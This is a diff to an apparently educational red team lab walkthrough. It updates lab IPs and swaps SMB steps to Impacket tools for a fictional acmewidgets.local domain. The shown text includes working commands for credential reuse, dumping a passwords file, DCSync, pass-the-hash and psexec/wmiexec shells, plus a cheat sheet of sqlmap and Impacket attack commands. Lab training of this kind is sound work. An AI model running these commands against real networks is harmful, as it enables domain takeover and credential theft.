@@ -10,28 +10,26 @@ Welcome to the Red Team Training Lab. You will play the role of a penetration te
                     INTERNET (172.16.0.0/24)
                     +---------------------------+
                     |  kali (172.16.0.10)       |  <-- Your Attack Box
-                    |  redir1 (172.16.0.20)     |
-                    |  redir2 (172.16.0.21)     |
-                    |  webserver (172.16.0.100) |  <-- WordPress (your target!)
+                    |  wordpress (172.16.0.100) |  <-- WordPress (your target!)
                     +-----------+---------------+
                                 |
                     ============|============  (Firewall)
                                 |
                     DMZ (172.16.1.0/24)
                     +-----------------------+
-                    | webserver (172.16.1.10) |  <-- Same server, internal IP
+                    | wordpress (172.16.1.10) |  <-- Same server, internal IP
                     +-----------+-----------+
                                 |
                     ============|============  (Firewall)
                                 |
                     INTERNAL (172.16.2.0/24)
                     +-----------------------+
-                    | DC01 (172.16.2.10)     |  <-- Domain Controller
-                    | fileserver (.2.20)     |  <-- SMB File Server
-                    | ws01 (172.16.2.30)     |  <-- Employee Workstation
+                    | fileserver (172.16.2.10) |  <-- SMB File Server
+                    | ws01 (172.16.2.11)       |  <-- Employee Workstation
+                    | dc01 (172.16.2.12)       |  <-- Domain Controller
                     +-----------------------+
 
-Note: The webserver is multi-homed - accessible from your network at
+Note: The wordpress server is multi-homed - accessible from your network at
 172.16.0.100 and internally at 172.16.1.10.
 ```
 
@@ -214,41 +212,53 @@ However, let's first test if any of these credentials work on any accessible ser
 
 ### 3.2 Testing SMB Access
 
-Let's see if there's a file server accessible from the DMZ that uses these same credentials.
+Let's see if there's a file server accessible from the DMZ that uses these same credentials. We'll use Impacket tools for this - they're more powerful and commonly used in red team engagements.
 
 ```bash
 # First, check if we can reach internal hosts (we're simulating pivoting)
 # In this lab, the networks are connected for training purposes
 
-# List SMB shares on the file server
-smbclient -L //172.16.2.20 -U svc_backup%Backup2024!
+# Connect to the file server with impacket-smbclient
+impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
 ```
 
 **What you're doing:** Testing if the `svc_backup` credentials from the WordPress database also work on the file server (credential reuse attack).
 
+Once connected, list available shares:
+```
+# shares
+```
+
 **Expected result:** You should see shares including:
 - `public` - Open to everyone
 - `sensitive` - Restricted (but svc_backup has access!)
-- `accounting` - Restricted
+- `IPC$` - Inter-process communication
 
 ### 3.3 Accessing Sensitive Files
 
 ```bash
-# Connect to the sensitive share
-smbclient //172.16.2.20/sensitive -U svc_backup%Backup2024!
+# Connect and access the sensitive share
+impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
 ```
 
 Once connected, explore the contents:
 ```
-smb: \> ls
-smb: \> cd <directory>
-smb: \> get <filename>
+# use sensitive
+# ls
+# cat passwords.txt
 ```
 
-Or download everything at once:
+**Impacket vs traditional smbclient:** Impacket tools use a different command syntax:
+- `use <share>` - Connect to a share
+- `ls` - List files
+- `cat <file>` - Display file contents (no need to download first!)
+- `get <file>` - Download a file
+- `exit` - Disconnect
+
+Alternative one-liner to dump the file:
 ```bash
-# Recursively download the sensitive share
-smbget -R smb://172.16.2.20/sensitive -U svc_backup%Backup2024!
+# Pipe commands to impacket-smbclient
+echo -e 'use sensitive\ncat passwords.txt\nexit' | impacket-smbclient 'svc_backup:Backup2024!@172.16.2.10'
 ```
 
 ### 3.4 Critical Discovery
@@ -339,8 +349,10 @@ Remember the `svc_backup` account? This service account has been misconfigured w
 
 ```bash
 # Use secretsdump.py to perform DCSync
-impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.10'
+impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.12'
 ```
+
+**Note:** Samba 4 (which this lab uses) has limited DCSync support. If secretsdump fails with `rpc_s_access_denied`, you can still use the Domain Admin credentials discovered in `passwords.txt` to compromise the domain.
 
 **What you're doing:**
 - Authenticating as `svc_backup`
@@ -370,7 +382,16 @@ You don't even need to crack the password. Use the hash directly:
 
 ```bash
 # Use the Administrator's NTLM hash to get a shell
-impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@172.16.2.10
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@172.16.2.12
+```
+
+**Alternative:** If DCSync failed on Samba, use the plaintext password from passwords.txt:
+```bash
+# Direct authentication with Domain Admin credentials
+impacket-psexec 'Administrator:Adm1n2024!@172.16.2.12'
+
+# Or use wmiexec for a lighter footprint
+impacket-wmiexec 'Administrator:Adm1n2024!@172.16.2.12'
 ```
 
 **You now have Domain Admin access!**
@@ -430,8 +451,8 @@ Here's the complete attack chain you executed:
                - svc_backup / Backup2024!
 
 3. LATERAL MOVEMENT
-   └── Credential reuse on file server (172.16.2.20)
-       └── Accessed "sensitive" SMB share
+   └── Credential reuse on file server (172.16.2.10)
+       └── Accessed "sensitive" SMB share with Impacket
            └── Found Domain Admin password in passwords.txt
 
 4. BROWSER EXPLOITATION (Alternative Path)
@@ -508,7 +529,7 @@ impacket-ticketer -domain acmewidgets.local -domain-sid <SID> -krbtgt <HASH> Adm
 ### Exercise 4: BloodHound Analysis
 Run BloodHound to visualize the attack paths:
 ```bash
-bloodhound-python -u svc_backup -p 'Backup2024!' -d acmewidgets.local -ns 172.16.2.10
+bloodhound-python -u svc_backup -p 'Backup2024!' -d acmewidgets.local -ns 172.16.2.12
 ```
 
 ---
@@ -525,13 +546,16 @@ sqlmap -u "<URL>" --dbs                    # List databases
 sqlmap -u "<URL>" -D <db> --tables         # List tables
 sqlmap -u "<URL>" -D <db> -T <tbl> --dump  # Dump table
 
-# SMB
-smbclient -L //<IP> -U <user>%<pass>       # List shares
-smbclient //<IP>/<share> -U <user>%<pass>  # Connect to share
+# SMB with Impacket
+impacket-smbclient '<user>:<pass>@<IP>'               # Interactive SMB
+# Inside: shares, use <share>, ls, cat <file>, get <file>
 
-# Active Directory
+# Active Directory with Impacket
 impacket-secretsdump '<domain>/<user>:<pass>@<DC>'    # DCSync
+impacket-psexec '<user>:<pass>@<IP>'                  # Remote shell via SMB
 impacket-psexec -hashes <LM>:<NTLM> <user>@<IP>       # Pass-the-Hash
+impacket-wmiexec '<user>:<pass>@<IP>'                 # Remote shell via WMI
+impacket-atexec '<user>:<pass>@<IP>' <command>        # Remote command via Task Scheduler
 
 # BeEF
 beef-xss                                   # Start BeEF
